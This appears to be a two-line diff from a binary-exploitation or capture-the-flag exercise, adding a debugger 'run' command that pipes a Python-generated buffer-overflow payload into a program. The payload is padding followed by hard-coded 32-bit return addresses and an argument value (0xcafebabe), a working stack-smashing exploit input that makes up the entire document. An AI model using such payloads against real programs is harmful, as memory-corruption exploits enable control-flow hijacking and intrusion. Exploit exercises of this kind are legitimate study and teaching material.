@@ -1,0 +1,2 @@
+ 
+run args < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 24 + b"\xa6\x91\x04\x08" + b"\x80\x90\x04\x08" + b"\xbe\xba\xfe\xca")')
